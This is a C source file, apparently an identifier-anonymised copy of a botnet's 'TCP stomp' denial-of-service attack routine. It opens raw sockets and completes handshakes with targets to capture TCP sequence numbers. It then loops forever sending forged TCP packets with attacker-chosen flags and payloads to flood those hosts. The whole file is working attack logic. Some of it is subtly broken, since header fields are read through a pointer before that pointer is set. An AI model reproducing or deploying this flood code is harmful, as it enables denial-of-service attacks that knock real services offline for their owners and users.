
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


typedef int uint8_t ;
typedef int uint32_t ;
typedef int uint16_t ;
typedef int time_t ;
struct tcphdr {int source; int ack; int seq; int ack_seq; int dest; int doff; int fin; int window; scalar_t__ check; void* rst; void* syn; void* psh; void* urg; } ;
struct TYPE_4__ {scalar_t__ s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_2__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int version; int ihl; int tos; int id; int ttl; scalar_t__ daddr; scalar_t__ check; int saddr; int protocol; void* frag_off; void* tot_len; } ;
struct TYPE_3__ {int sin_port; } ;
struct attack_target {int netmask; int addr; TYPE_1__ sock_addr; } ;
struct attack_stomp_data {scalar_t__ addr; int seq; int ack_seq; int sport; int dport; } ;
struct attack_option {int dummy; } ;
typedef int socklen_t ;
typedef int port_t ;
typedef int pktbuf ;
typedef void* BOOL ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 int VAR_12 ;
 int VAR_13 ;
 int VAR_14 ;
 int VAR_15 ;
 int VAR_16 ;
 int VAR_17 ;
 int VAR_18 ;
 int VAR_19 ;
 int VAR_20 ;
 int VAR_21 ;
 int VAR_22 ;
 int VAR_23 ;
 int VAR_24 ;
 int VAR_25 ;
 void* FUNC_0 (int,struct attack_option*,int ,int) ;
 void* FUNC_1 (int,int) ;
 scalar_t__ FUNC_2 (int*,int) ;
 scalar_t__ FUNC_3 (struct iphdr*,struct tcphdr*,void*,int) ;
 int FUNC_4 (int) ;
 int FUNC_5 (int,struct sockaddr*,int) ;
 scalar_t__ VAR_26 ;
 int FUNC_6 (int,int ,int) ;
 scalar_t__ FUNC_7 (void*) ;
 void* FUNC_8 (int) ;
 char* FUNC_9 (int) ;
 void* FUNC_10 (int) ;
 int FUNC_11 (char*,...) ;
 int FUNC_12 () ;
 int FUNC_13 (char*,int) ;
 int FUNC_14 (int,char*,int,int ,struct sockaddr*,int*) ;
 int FUNC_15 (int,char*,int,int ,struct sockaddr*,int) ;
 int FUNC_16 (int,int ,int ,int*,int) ;
 int FUNC_17 (int ,int ,int ) ;
 int FUNC_18 (int *) ;

void FUNC_19(uint8_t VAR_27, struct attack_target *VAR_28, uint8_t VAR_29, struct attack_option *VAR_30)
{
    int VAR_31, VAR_32;
    struct attack_stomp_data *VAR_33 = FUNC_1(VAR_27, sizeof (struct attack_stomp_data));
    char **VAR_34 = FUNC_1(VAR_27, sizeof (char *));
    uint8_t VAR_35 = FUNC_0(VAR_29, VAR_30, VAR_6, 0);
    uint16_t VAR_36 = FUNC_0(VAR_29, VAR_30, VAR_5, 0xffff);
    uint8_t VAR_37 = FUNC_0(VAR_29, VAR_30, VAR_7, 64);
    BOOL VAR_38 = FUNC_0(VAR_29, VAR_30, VAR_4, VAR_25);
    port_t VAR_39 = FUNC_0(VAR_29, VAR_30, VAR_2, 0xffff);
    BOOL VAR_40 = FUNC_0(VAR_29, VAR_30, VAR_13, VAR_14);
    BOOL VAR_41 = FUNC_0(VAR_29, VAR_30, VAR_1, VAR_25);
    BOOL VAR_42 = FUNC_0(VAR_29, VAR_30, VAR_10, VAR_25);
    BOOL VAR_43 = FUNC_0(VAR_29, VAR_30, VAR_11, VAR_14);
    BOOL VAR_44 = FUNC_0(VAR_29, VAR_30, VAR_12, VAR_14);
    BOOL VAR_45 = FUNC_0(VAR_29, VAR_30, VAR_3, VAR_14);
    int VAR_46 = FUNC_0(VAR_29, VAR_30, VAR_9, 768);
    BOOL VAR_47 = FUNC_0(VAR_29, VAR_30, VAR_8, VAR_25);


    if ((VAR_32 = FUNC_17(VAR_0, VAR_23, VAR_18)) == -1)
    {



        return;
    }
    VAR_31 = 1;
    if (FUNC_16(VAR_32, VAR_17, VAR_19, &VAR_31, sizeof (int)) == -1)
    {



        FUNC_4(VAR_32);
        return;
    }


    for (VAR_31 = 0; VAR_31 < VAR_27; VAR_31++)
    {
        int VAR_48;
        struct sockaddr_in VAR_49, VAR_50;
        socklen_t VAR_51;
        char VAR_52[256];
        time_t VAR_53;

        stomp_setup_nums:

        if ((VAR_48 = FUNC_17(VAR_0, VAR_24, 0)) == -1)
        {



            continue;
        }


        FUNC_6(VAR_48, VAR_16, FUNC_6(VAR_48, VAR_15, 0) | VAR_22);


        VAR_49.sin_family = VAR_0;
        if (VAR_28[VAR_31].netmask < 32)
            VAR_49.sin_addr.s_addr = FUNC_7(FUNC_10(VAR_28[VAR_31].addr) + (((uint32_t)FUNC_12()) >> VAR_28[VAR_31].netmask));
        else
            VAR_49.sin_addr.s_addr = VAR_28[VAR_31].addr;
        if (VAR_39 == 0xffff)
            VAR_49.sin_port = FUNC_12() & 0xffff;
        else
            VAR_49.sin_port = FUNC_8(VAR_39);


        FUNC_5(VAR_48, (struct sockaddr *)&VAR_49, sizeof (struct sockaddr_in));
        VAR_53 = FUNC_18(((void*)0));


        while (VAR_25)
        {
            int VAR_54;

            VAR_51 = sizeof (struct sockaddr_in);
            VAR_54 = FUNC_14(VAR_32, VAR_52, sizeof (VAR_52), VAR_21, (struct sockaddr *)&VAR_50, &VAR_51);
            if (VAR_54 == -1)
            {



                return;
            }
            if (VAR_50.sin_addr.s_addr == VAR_49.sin_addr.s_addr && VAR_54 > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
            {
                struct tcphdr *VAR_55 = (struct tcphdr *)(VAR_52 + sizeof (struct iphdr));

                if (VAR_55->source == VAR_49.sin_port)
                {
                    if (VAR_55->syn && VAR_55->ack)
                    {
                        struct iphdr *VAR_56;
                        struct tcphdr *VAR_57;
                        char *VAR_58;

                        VAR_33[VAR_31].addr = VAR_49.sin_addr.s_addr;
                        VAR_33[VAR_31].seq = FUNC_10(VAR_57->seq);
                        VAR_33[VAR_31].ack_seq = FUNC_10(VAR_57->ack_seq);
                        VAR_33[VAR_31].sport = VAR_57->dest;
                        VAR_33[VAR_31].dport = VAR_49.sin_port;




                        VAR_34[VAR_31] = FUNC_9(sizeof (struct iphdr) + sizeof (struct tcphdr) + VAR_46);
                        VAR_56 = (struct iphdr *)VAR_34[VAR_31];
                        VAR_57 = (struct tcphdr *)(VAR_56 + 1);
                        VAR_58 = (char *)(VAR_57 + 1);

                        VAR_56->version = 4;
                        VAR_56->ihl = 5;
                        VAR_56->tos = VAR_35;
                        VAR_56->tot_len = FUNC_8(sizeof (struct iphdr) + sizeof (struct tcphdr) + VAR_46);
                        VAR_56->id = FUNC_8(VAR_36);
                        VAR_56->ttl = VAR_37;
                        if (VAR_38)
                            VAR_56->frag_off = FUNC_8(1 << 14);
                        VAR_56->protocol = VAR_18;
                        VAR_56->saddr = VAR_20;
                        VAR_56->daddr = VAR_33[VAR_31].addr;

                        VAR_57->source = VAR_33[VAR_31].sport;
                        VAR_57->dest = VAR_33[VAR_31].dport;
                        VAR_57->seq = VAR_33[VAR_31].ack_seq;
                        VAR_57->ack_seq = VAR_33[VAR_31].seq;
                        VAR_57->doff = 8;
                        VAR_57->fin = VAR_25;
                        VAR_57->ack = VAR_25;
                        VAR_57->window = FUNC_12() & 0xffff;
                        VAR_57->urg = VAR_40;
                        VAR_57->ack = VAR_41;
                        VAR_57->psh = VAR_42;
                        VAR_57->rst = VAR_43;
                        VAR_57->syn = VAR_44;
                        VAR_57->fin = VAR_45;

                        FUNC_13(VAR_58, VAR_46);
                        break;
                    }
                    else if (VAR_55->fin || VAR_55->rst)
                    {
                        FUNC_4(VAR_48);
                        goto stomp_setup_nums;
                    }
                }
            }

            if (FUNC_18(((void*)0)) - VAR_53 > 10)
            {



                FUNC_4(VAR_48);
                goto stomp_setup_nums;
            }
        }
    }


    while (VAR_25)
    {
        for (VAR_31 = 0; VAR_31 < VAR_27; VAR_31++)
        {
            char *VAR_59 = VAR_34[VAR_31];
            struct iphdr *VAR_60 = (struct iphdr *)VAR_59;
            struct tcphdr *VAR_61 = (struct tcphdr *)(VAR_60 + 1);
            char *VAR_62 = (char *)(VAR_61 + 1);

            if (VAR_36 == 0xffff)
                VAR_60->id = FUNC_12() & 0xffff;

            if (VAR_47)
                FUNC_13(VAR_62, VAR_46);

            VAR_60->check = 0;
            VAR_60->check = FUNC_2((uint16_t *)VAR_60, sizeof (struct iphdr));

            VAR_61->seq = FUNC_8(VAR_33[VAR_31].seq++);
            VAR_61->ack_seq = FUNC_8(VAR_33[VAR_31].ack_seq);
            VAR_61->check = 0;
            VAR_61->check = FUNC_3(VAR_60, VAR_61, FUNC_8(sizeof (struct tcphdr) + VAR_46), sizeof (struct tcphdr) + VAR_46);

            VAR_28[VAR_31].sock_addr.sin_port = VAR_61->dest;
            FUNC_15(VAR_32, VAR_59, sizeof (struct iphdr) + sizeof (struct tcphdr) + VAR_46, VAR_21, (struct sockaddr *)&VAR_28[VAR_31].sock_addr, sizeof (struct sockaddr_in));
        }





    }
}
